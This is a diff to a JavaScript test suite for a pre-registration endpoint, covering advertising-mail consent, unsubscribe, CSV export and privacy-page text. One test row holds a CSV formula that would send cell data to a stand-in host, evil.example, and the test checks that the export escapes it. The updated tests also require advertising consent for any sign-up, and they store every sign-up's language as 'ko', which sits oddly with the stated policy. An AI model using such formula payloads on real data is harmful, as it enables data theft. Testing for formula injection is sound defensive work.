@@ -36,7 +36,8 @@ const call = (path, init = {}, addr) => worker.fetch(new Request("https://lic.ex
   { ...init, headers: { "CF-Connecting-IP": addr || "10.9." + (++ip & 255) + ".1", ...(init.headers || {}) } }), env);
 const j = async (path, init, addr) => { const r = await call(path, init, addr); return { http: r.status, cors: r.headers.get("access-control-allow-origin"), ...(await r.json()) }; };
 const post = (body, headers = {}, addr) => j("/preorder", { method: "POST", headers: { Origin: SITE, "Content-Type": "application/json", ...headers }, body }, addr);
-const pre = (b, addr) => post(JSON.stringify(b), {}, addr);
+// adConsent (the advertising-mail consent) is sent unless a test says otherwise
+const pre = (b, addr) => post(JSON.stringify({ adConsent: true, ...b }), {}, addr);
 const adm = (path, body, auth = TOKEN) => j("/admin/api" + path, { method: body ? "POST" : "GET", headers: { Authorization: "Bearer " + auth, "Content-Type": "application/json" }, body: body ? JSON.stringify(body) : undefined });
 const rows = () => st.rows("SELECT * FROM preorders ORDER BY at");
 const realNow = Date.now;
@@ -84,24 +85,33 @@ delete env.PREORDER_ORIGINS;
 
 // consent and email are checked; nothing is written for a refusal
 assert.deepEqual([(await pre({ email: "a@b.com", plan: "ultra" })).error], ["consent"]);
+// the advertising-mail consent is its own: missing, false or anything but true is the same 400 consent, nothing written
+for (const ad of [undefined, false, "true", 1, null]) {
+  const b = { email: "ad@example.com", plan: "free", consent: true, ...(ad === undefined ? {} : { adConsent: ad }) };
+  r = await post(JSON.stringify(b));
+  assert.deepEqual([r.http, r.error, r.cors], [400, "consent", SITE], "adConsent " + String(ad));
+}
+assert.deepEqual([(await post(JSON.stringify({ email: "ad@example.com", adConsent: true })))].map(x => [x.http, x.error])[0], [400, "consent"], "adConsent alone is not consent");
 assert.deepEqual([(await pre({ email: "not-mail", consent: true })).error], ["email"]);
 assert.deepEqual([(await pre({ email: "a".repeat(250) + "@b.com", consent: true })).error], ["email"]);
 assert.equal(rows().length, 0);
 
 // a sign-up (charset in the type is fine); the same address in other case writes nothing; no KV write at all
-r = await post(JSON.stringify({ email: "  Fan@Example.com ", plan: "ultra", lang: "ko", consent: true }), { "Content-Type": "application/json; charset=UTF-8" });
+r = await post(JSON.stringify({ email: "  Fan@Example.com ", plan: "ultra", lang: "en", consent: true, adConsent: true }), { "Content-Type": "application/json; charset=UTF-8" });
 assert.deepEqual([r.http, r.ok, r.already, r.cors], [200, true, undefined, SITE]);
 const fresh1 = r;
 r = await pre({ email: "fan@example.COM", plan: "free", lang: "en", consent: true });
 // the same answer as a new sign-up: nobody can ask the server whether an address is on the list
 assert.deepEqual(r, fresh1, "an address already there gets the same answer as a new one");
 assert.equal(rows().length, 1);
-assert.deepEqual([rows()[0].email, rows()[0].plan, rows()[0].lang], ["fan@example.com", "ultra", "ko"]);
+assert.deepEqual([rows()[0].email, rows()[0].plan, rows()[0].lang], ["fan@example.com", "ultra", "ko"], "lang is stored as ko whatever the site sends");
+assert.equal(rows()[0].adAt, Date.parse("2026-11-20T03:00:00Z"), "the advertising-mail consent time is kept with the row (ms, like at)");
+assert.equal(rows()[0].adAt, rows()[0].at);
 assert.equal(kvWrites, 0, "pre-registration writes no KV");
 // unknown plan and language fall back; nothing else is stored (no address, no user agent)
 await pre({ email: "two@example.com", plan: "lifetime", lang: "xx", consent: true });
-assert.deepEqual(Object.keys(rows()[1]).sort(), ["at", "email", "id", "lang", "plan"]);
-assert.deepEqual([rows()[1].plan, rows()[1].lang], ["undecided", "en"]);
+assert.deepEqual(Object.keys(rows()[1]).sort(), ["adAt", "at", "email", "id", "lang", "plan"]);
+assert.deepEqual([rows()[1].plan, rows()[1].lang], ["undecided", "ko"]);
 assert.equal(preEmail("x@y.z"), null);
 
 // addresses: real ones (with + and dots) pass; nothing a spreadsheet would run as a formula, no quote, comma or space,
@@ -197,7 +207,7 @@ assert.equal(list.http, 200);
 assert.deepEqual([list.count, list.fresh, list.today, list.open, list.shown], [8, 8, 8, true, true]);
 assert.deepEqual(numbers(list), brute());
 assert.equal(list.byPlan.ultra, 1);
-assert.equal(list.byLang.ko, 1);
+assert.deepEqual(list.byLang, { ko: 8 }, "every sign-up through the site is stored as ko");
 assert.ok(!JSON.stringify(list).includes("@"), "no email in the list");
 assert.equal(list.recent.length, 8);
 // 확인 clears the new count; a later sign-up is new again
@@ -233,6 +243,8 @@ await adm("/preorders");
 await pre({ email: "plan@example.com", consent: true });
 await adm("/preorders/seen", {});
 await adm("/preorders/delete", { email: "plan@example.com" });
+await call("/preorder/unsubscribe", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "email=late%40example.com" });
+await pre({ email: "late@example.com", plan: "biz", consent: true });   // back, for the counts below
 const queries = [...new Set(st.trace)].filter(q => /\b(preorders|counters|meta)\b/.test(q));
 st.trace = null;
 assert.ok(queries.some(q => /ORDER BY at DESC/.test(q)) && queries.some(q => /INSERT INTO preorders/.test(q)), "the traced calls ran");
@@ -247,9 +259,11 @@ assert.ok(!queries.some(q => /COUNT\(\*\) AS n FROM preorders$/.test(q)), "no co
 st.db.prepare("INSERT INTO preorders (id, email, plan, lang, at) VALUES (?, ?, ?, ?, ?)").run(await preId(FORMULA), FORMULA, "free", "en", Date.now());
 const ex = await adm("/preorders/export", {});
 assert.equal(ex.count, 10);
-assert.match(ex.csv, /^email,plan,lang,at\r\n/);
-assert.match(ex.csv, /\r\nfan@example\.com,ultra,ko,2026-11-20T03:00:00\.000Z\r\n/);
-assert.ok(ex.csv.includes('\r\n"\'=hyperlink(""http://evil.example/?""&a2&""@a.bc"",""x"")",free,en,2026-11-20T04:00:00.000Z'), "the formula is text");
+assert.match(ex.csv, /^email,plan,lang,at,adAt\r\n/, "adAt is the last column; the ones before it are as they were");
+assert.match(ex.csv, /\r\nfan@example\.com,ultra,ko,2026-11-20T03:00:00\.000Z,2026-11-20T03:00:00\.000Z\r\n/, "adAt as an ISO time");
+assert.ok((ex.csv + "\r\n").includes('\r\n"\'=hyperlink(""http://evil.example/?""&a2&""@a.bc"",""x"")",free,en,2026-11-20T04:00:00.000Z,\r\n'),
+          "the formula is text; a row taken before adConsent has an empty adAt");
+assert.ok(ex.csv.split("\r\n").every(l => l.split(",").length >= 5), "five columns on every line");
 assert.ok(!/(^|\r\n|,)"?[=+\-@\t\r]/.test(ex.csv), "no cell starts with = + - @");
 assert.deepEqual(numbers(await adm("/preorders")), brute(), "the export counts the totals again (the row put in by hand is in them)");
 const log = st.rows("SELECT action, detail FROM audit_log");
@@ -304,6 +318,20 @@ const st2 = fakeStats(Stats, oldDb);
 assert.equal(oldDb.prepare("SELECT COUNT(*) AS n FROM sqlite_master WHERE type = 'index' AND name = 'preorders_at'").get().n, 1);
 const r2 = at("2026-11-21T00:00:00Z", () => st2.obj.pre("/pre/read", { recent: 10 }));
 assert.deepEqual([r2.count, r2.today, r2.fresh, r2.byPlan, r2.byLang, r2.recent.length], [3, 2, 3, { ultra: 1, free: 2 }, { ko: 2, ja: 1 }, 3]);
+// adAt is added to that table as a nullable column: the old rows stay, with adAt null, and export with it empty
+assert.ok(oldDb.prepare("SELECT name FROM pragma_table_info('preorders')").all().some(c => c.name === "adAt"), "the adAt column was added");
+assert.deepEqual(oldDb.prepare("SELECT email, adAt FROM preorders ORDER BY at").all().map(x => [x.email, x.adAt]), [["a@x.com", null], ["b@x.com", null], ["c@x.com", null]]);
+const st3 = fakeStats(Stats, oldDb);   // a second start on the migrated table changes nothing
+assert.equal(oldDb.prepare("SELECT COUNT(*) AS n FROM pragma_table_info('preorders') WHERE name = 'adAt'").get().n, 1);
+const ex2 = at("2026-11-21T00:00:00Z", () => st3.obj.pre("/pre/export", {}));
+assert.deepEqual(ex2.rows.map(x => x.adAt), [null, null, null]);
+// an old row whose address signs up again with adConsent gets its time (the answer is the same "already")
+const again = at("2026-11-21T01:00:00Z", () => st3.obj.pre("/pre/add", { id: "0".repeat(32), email: "x", plan: "free", lang: "ko", ip: "a".repeat(16), net: "b".repeat(16) }));
+assert.equal(again.ok, true);
+const oldId = await preId("a@x.com");
+assert.equal(at("2026-11-21T01:00:00Z", () => st3.obj.pre("/pre/add", { id: oldId, email: "a@x.com", plan: "free", lang: "ko", ad: true, ip: "a".repeat(16), net: "b".repeat(16) })).already, true);
+assert.equal(oldDb.prepare("SELECT adAt FROM preorders WHERE id = ?").get(oldId).adAt, Date.parse("2026-11-21T01:00:00Z"));
+assert.equal(oldDb.prepare("SELECT adAt FROM preorders WHERE id = ?").get("0".repeat(32)).adAt, null, "no ad: no adAt");
 
 // /privacy: the policy in force (privacy_prev_page.js, word for word) gets the pre-registration notice while the rows
 // exist (support.js withPreorder): a box under the date and the section #preorder that the site's consent text links
@@ -312,10 +340,12 @@ const page = async (path, iso) => {
   try { const r = await call(path); return { http: r.status, text: await r.text() }; } finally { Date.now = realNow; }
 };
 for (const [q, words] of [
-  ["", ["별도 안내: 공식 사이트 사전예약", "메일 주소, 관심 플랜, 사이트 언어, 신청 시각", "2026년 11월 20일부터 적용해요",
+  ["", ["별도 안내: 공식 사이트 사전예약", "메일 주소, 관심 플랜, 사이트 언어, 신청 시각, 광고성 정보 수신 동의 시각", "2026년 11월 20일부터 적용해요",
+        "수신 거부는 https://systemboost-license.euning97.workers.dev/preorder/unsubscribe 에 신청한 메일 주소만 넣으면 바로 돼요",
         "사전예약 창에서 동의 칸에 체크한 경우만, 2026년 11월 27일 23:59(한국 시간)까지 받아요. 만 14세 이상만",
         "2027년 2월 28일에 서버에서 모두 지워요", "Cloudflare(제4조)", "동의하지 않아도 돼요", "제5조의 방법(웹 /help, 제10조의 메일)"]],
-  ["?lang=en", ["Separate notice: pre-registration on the official site", "Email address, plan of interest, site language, time of sign-up",
+  ["?lang=en", ["Separate notice: pre-registration on the official site", "Email address, plan of interest, site language, time of sign-up, time of consent to receive advertising information",
+                "To unsubscribe, enter that address at https://systemboost-license.euning97.workers.dev/preorder/unsubscribe",
                 "It applies from November 20, 2026.", "until November 27, 2026, 23:59 (Korean time). 14 or older only",
                 "All deleted from the server on February 28, 2027", "You may refuse.", "Your rights"]]]) {
   const p = await page("/privacy" + q, "2026-11-21T00:00:00Z");
@@ -327,6 +357,8 @@ for (const [q, words] of [
   // the new policy (?next=1) lists pre-registration in its own articles, without this notice
   const nx = await page("/privacy?next=1" + q.replace("?", "&"), "2026-11-21T00:00:00Z");
   assert.ok(!nx.text.includes('id="preorder') && nx.text.includes(q ? "Pre-registration on the official site" : "공식 사이트의 사전예약"), q + ": ?next=1");
+  assert.ok(nx.text.includes(q ? "sign-up time and the time of consent to receive advertising information" : "신청 시각, 광고성 정보 수신 동의 시각")
+            && nx.text.includes("https://systemboost-license.euning97.workers.dev/preorder/unsubscribe"), q + ": ?next=1 has the consent time and the unsubscribe page");
   // gone with the rows on 2027-02-28 KST
   assert.ok((await page("/privacy" + q, "2027-02-27T14:59:00Z")).text.includes('id="preorder"'));
   assert.ok(!(await page("/privacy" + q, "2027-02-27T15:00:00Z")).text.includes('id="preorder'), q + ": gone on the day the rows go");
